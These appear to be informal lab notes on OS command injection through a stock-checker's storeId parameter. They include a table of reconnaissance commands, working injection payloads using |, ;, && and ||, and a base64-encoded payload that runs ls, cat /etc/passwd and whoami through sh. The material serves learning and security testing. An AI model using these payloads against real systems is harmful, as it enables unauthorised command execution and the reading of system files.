# OS command injection

OS command injection

stockTD=1 ; whoami or base64 encode
use case something tht after u press display out like check stock return--> number

Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

Why 1 | whoami works:
The application is likely executing a command like: stock_checker 7 1

When you inject 1 | whoami, the command becomes: stock_checker 7 1 | whoami

This pipes the output of the stock checker to the whoami command

Since 1 is a valid store ID, the first command succeeds and pipes to your injected command

Why whoami alone doesn't work:
The command becomes: stock_checker 7 whoami

The application expects a numeric store ID, so whoami is treated as an invalid store ID

The stock checker likely fails before any command injection can occur

```text
storeId=1 | whoami
storeId=1 ; whoami
storeId=1 && whoami
storeId=1 || whoami
```

bypass with base64

```bash
# Encode multiple commands
echo -n 'ls -la; cat /etc/passwd; whoami' | base64
# Returns: bHMgLWxhOyBjYXQgL2V0Yy9wYXNzd2Q7IHdob2FtaQo=
```

```bash
# Use in injection
productId=7&storeId=1|echo bHMgLWxhOyBjYXQgL2V0Yy9wYXNzd2Q7IHdob2FtaQo=|base64 -d|sh
```
